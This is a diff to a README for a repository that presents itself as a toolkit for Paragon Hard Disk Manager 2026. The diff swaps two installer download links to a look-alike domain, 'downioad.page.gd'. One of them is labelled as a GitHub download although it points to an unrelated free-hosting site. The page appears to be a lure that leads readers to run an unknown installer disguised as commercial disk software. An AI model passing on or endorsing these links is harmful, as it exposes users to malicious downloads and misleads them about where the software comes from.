@@ -2,7 +2,7 @@
 
 This repository provides a comprehensive toolkit for Paragon Hard Disk Manager 2026, designed to enhance disk management, backup, and recovery on Windows systems. The tools and utilities included help users optimize their storage, protect critical data, and manage disk partitions with greater ease and reliability.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -48,7 +48,7 @@ A: First, ensure you are running the installer as an administrator and that your
 
 You can obtain the latest version of the toolkit from the official download page.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
